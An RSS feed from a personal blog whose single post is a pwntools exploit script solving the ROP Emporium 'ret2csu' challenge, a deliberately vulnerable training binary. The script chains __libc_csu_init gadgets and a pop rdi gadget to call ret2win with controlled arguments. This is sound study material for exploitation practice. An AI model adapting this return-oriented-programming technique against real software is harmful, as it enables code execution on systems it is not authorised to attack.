<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Sup! I&#39;m Rajat</title>
        <link>https://rjt-gupta.github.io/posts/</link>
        <description>Recent content in Posts on Sup! I&#39;m Rajat</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <atom:link href="https://rjt-gupta.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Ropemporium Ret2csu</title>
            <link>https://rjt-gupta.github.io/posts/1/01/ropemporium-ret2csu/</link>
            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
            
            <guid>https://rjt-gupta.github.io/posts/1/01/ropemporium-ret2csu/</guid>
            <description>from pwn import * # Set up pwntools for the correct architecture exe = context.binary = ELF(&amp;#39;ret2csu&amp;#39;) # Many built-in settings can be controlled on the command-line and show up # in &amp;#34;args&amp;#34;. For example, to dump all data sent/received, and disable ASLR # for all created processes... # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): &amp;#39;&amp;#39;&amp;#39;Start the exploit against the target.&amp;#39;&amp;#39;&amp;#39; if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.</description>
            <content type="html"><![CDATA[<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># Set up pwntools for the correct architecture</span>
exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;ret2csu&#39;</span>)

<span style="color:#75715e"># Many built-in settings can be controlled on the command-line and show up</span>
<span style="color:#75715e"># in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR</span>
<span style="color:#75715e"># for all created processes...</span>
<span style="color:#75715e"># ./exploit.py DEBUG NOASLR</span>


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)

<span style="color:#75715e"># Specify your GDB script here for debugging</span>
<span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
<span style="color:#75715e"># ./exploit.py GDB</span>
gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">tbreak main
</span><span style="color:#e6db74">continue
</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())

<span style="color:#75715e">#===========================================================</span>
<span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
<span style="color:#75715e">#===========================================================</span>
<span style="color:#75715e"># Arch:     amd64-64-little</span>
<span style="color:#75715e"># RELRO:    Partial RELRO</span>
<span style="color:#75715e"># Stack:    No canary found</span>
<span style="color:#75715e"># NX:       NX enabled</span>
<span style="color:#75715e"># PIE:      No PIE (0x400000)</span>
<span style="color:#75715e"># RUNPATH:  &#39;.&#39;</span>

io <span style="color:#f92672">=</span> start()

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x00000000004006a3: pop rdi; ret; 
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">First gadget - 
</span><span style="color:#e6db74">0x000000000040069a &lt;+90&gt;:	pop    rbx
</span><span style="color:#e6db74">0x000000000040069b &lt;+91&gt;:	pop    rbp
</span><span style="color:#e6db74">0x000000000040069c &lt;+92&gt;:	pop    r12
</span><span style="color:#e6db74">0x000000000040069e &lt;+94&gt;:	pop    r13
</span><span style="color:#e6db74">0x00000000004006a0 &lt;+96&gt;:	pop    r14
</span><span style="color:#e6db74">0x00000000004006a2 &lt;+98&gt;:	pop    r15
</span><span style="color:#e6db74">0x00000000004006a4 &lt;+100&gt;:	ret  
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Second gadget - 
</span><span style="color:#e6db74">0x0000000000400680 &lt;+64&gt;:	mov    rdx,r15
</span><span style="color:#e6db74">0x0000000000400683 &lt;+67&gt;:	mov    rsi,r14
</span><span style="color:#e6db74">0x0000000000400686 &lt;+70&gt;:	mov    edi,r13d
</span><span style="color:#e6db74">0x0000000000400689 &lt;+73&gt;:	call   QWORD PTR [r12+rbx*8]
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

ret2win <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400510</span>)
arg_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
arg_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
arg_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
first_gadget <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040069a</span>)
second_gadget <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0000000000400680</span>)
pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00000000004006a3</span>)
init <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x600e38</span>)   <span style="color:#75715e"># x/10gx &amp;_DYNAMIC</span>

buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
buf <span style="color:#f92672">+=</span> first_gadget
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)   <span style="color:#75715e"># we need rbx to be 0</span>
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1</span>)   <span style="color:#75715e"># set 0x1 to rbp</span>
buf <span style="color:#f92672">+=</span> init       <span style="color:#75715e"># we need a valid func address because call dereferences it and then calls so cant put ret2win here</span>
buf <span style="color:#f92672">+=</span> arg_one
buf <span style="color:#f92672">+=</span> arg_two
buf <span style="color:#f92672">+=</span> arg_three

<span style="color:#75715e"># Now move to second gadget</span>
buf <span style="color:#f92672">+=</span> second_gadget
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># add rsp,0x8</span>
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># pop rbx</span>
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># pop rbp</span>
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># pop r12</span>
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># pop r13</span>
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># pop 14</span>
buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># pop r15</span>
buf <span style="color:#f92672">+=</span> pop_rdi   <span style="color:#75715e"># This stuff is amazing, we can only control edi using gadget_two, so again need to put arg_one into rdi</span>
buf <span style="color:#f92672">+=</span> arg_one   <span style="color:#75715e"># Before calling ret2win</span>
buf <span style="color:#f92672">+=</span> ret2win

io<span style="color:#f92672">.</span>sendline(buf)

write(<span style="color:#e6db74">&#34;in.txt&#34;</span>, buf)   <span style="color:#75715e"># I use this to debug gdb&gt; r &lt; in.txt</span>
io<span style="color:#f92672">.</span>interactive()
</code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
